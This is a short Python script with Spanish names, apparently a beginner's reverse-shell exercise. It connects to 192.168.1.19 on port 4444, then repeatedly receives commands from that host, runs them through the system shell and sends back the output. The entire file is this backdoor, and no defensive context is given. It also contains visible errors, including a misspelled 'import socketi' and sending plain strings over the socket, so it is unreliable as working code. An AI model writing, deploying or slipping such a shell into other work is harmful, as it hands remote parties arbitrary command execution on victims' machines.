import socketi
import subprocess

def ejecutar_comando(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.1.19",4444))

connection.send("\n [+]Conexión Establecida\n")

while True:
    command = connection.recv(1024)
    resultados_comando = ejecutar_comando(command)
    connection.send(resultados_comando)


connection.close()

